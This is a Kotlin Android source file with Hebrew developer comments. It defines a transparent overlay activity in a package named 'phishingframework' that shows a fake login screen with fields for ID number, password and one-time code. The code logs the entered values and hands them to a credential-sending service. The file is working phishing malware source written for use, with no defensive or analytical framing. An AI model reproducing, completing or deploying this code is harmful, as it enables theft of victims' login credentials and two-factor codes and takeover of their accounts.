package com.example.phishingframework

import android.app.Activity
import android.content.Intent
import android.graphics.Color
import android.graphics.drawable.ColorDrawable
import android.os.Bundle
import android.util.Log
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText

class PhishingOverlayActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // רקע שקוף
        window.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))

        // מקלדת + resize
        window.setSoftInputMode(
            WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE or
                    WindowManager.LayoutParams.SOFT_INPUT_STATE_VISIBLE
        )

        // ממשק הפישינג שלך
        setContentView(R.layout.phishing_login_overlay)

        // עדכון לפי ה-IDים החדשים בלייאאוט
        val idField = findViewById<EditText>(R.id.id_field)
        val passwordField = findViewById<EditText>(R.id.password_field)
        val codeField = findViewById<EditText>(R.id.code_field)
        val loginButton = findViewById<Button>(R.id.login_button)

        loginButton.setOnClickListener {
            val idNumber = idField.text.toString()
            val pass = passwordField.text.toString()
            val code = codeField.text.toString()

            Log.d("PhishingOverlay", "id=$idNumber pass=$pass otp=$code")

            val intent = Intent(this, CredentialSendService::class.java).apply {
                putExtra("id", idNumber)       // ← כאן שינינו מ-"username" ל-"id"
                putExtra("password", pass)
                putExtra("code", code)
            }
            startService(intent)

            finish()
        }

        idField.requestFocus()
    }
}
